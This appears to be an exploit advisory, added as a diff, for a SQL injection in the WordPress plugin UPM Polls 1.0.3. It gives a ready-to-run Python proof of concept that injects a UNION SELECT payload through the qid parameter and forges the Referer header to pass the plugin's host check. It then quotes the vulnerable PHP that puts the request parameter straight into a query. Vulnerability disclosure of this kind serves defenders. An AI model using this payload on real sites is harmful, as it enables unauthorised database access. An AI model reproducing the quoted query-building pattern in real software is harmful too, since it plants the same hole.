@@ -1,0 +1,34 @@
+# Exploit Title: UPM Polls <= 1.0.3 SQL Injection Vulnerability
+# Date: 2011-08-06
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/upm-polls.1.0.3.zip
+# Version: 1.0.3 (tested)
+
+---
+PoC
+---
+#!/bin/python
+
+import re
+import urllib2
+import urlparse
+
+url = "http://www.site.com/wp-content/plugins/upm-polls/includes/poll_logs.php?qid=-1 UNION ALL SELECT NULL,CONCAT(CHAR(96),@@version,CHAR(96)),NULL,NULL,NULL,NULL-- ".replace(" ", "%20")
+req = urllib2.Request(url=url, headers={"Referer": url})
+content = urllib2.urlopen(req).read()
+match = re.search(r"`(.+)`", content)
+
+print match.group(1) if match else "None"
+
+---------------
+Vulnerable code
+---------------
+$ref = parse_url( $_SERVER['HTTP_REFERER'] );
+if( $_SERVER["HTTP_HOST"] != $ref['host'] ){
+	exit('UPM Error:128');
+}
+
+...
+
+$QID = $_GET['qid'];
+$POLL = $wpdb->get_row("SELECT * FROM `".$wpdb->prefix."pppm_polls` WHERE `id` = $QID", ARRAY_A);
